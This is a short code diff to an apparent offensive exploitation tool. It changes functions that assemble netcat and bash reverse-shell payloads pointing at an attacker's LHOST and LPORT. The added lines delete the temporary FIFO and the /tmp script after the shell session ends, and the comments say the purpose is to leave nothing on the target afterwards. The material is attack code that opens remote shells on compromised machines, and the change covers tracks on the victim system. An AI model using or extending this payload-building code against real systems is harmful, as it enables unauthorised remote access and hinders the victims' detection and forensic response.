@@ -71,7 +71,9 @@ def _netcat_reverse_shell(nc_alternative, use_dash_e=True):
     + settings.LHOST
     + settings.SINGLE_WHITESPACE
     + settings.LPORT
-    + " 1>" + tmp_fifo + "\""
+    # Taken away again when the pipeline ends, not only before it starts - cleared on the way in
+    # alone, the pipe is left on the target for good once the session closes.
+    + " 1>" + tmp_fifo + ";rm -f " + tmp_fifo + "\""
   )
 
 """
@@ -183,6 +185,10 @@ def gen_bash_reverse(separator):
     + settings.SINGLE_WHITESPACE
     + separator
     + " /bin/bash /tmp/"
+    + tmp_file
+    # Removed once the shell it started has ended, rather than left in the target's temp directory.
+    + separator
+    + " rm -f /tmp/"
     + tmp_file
   )
 
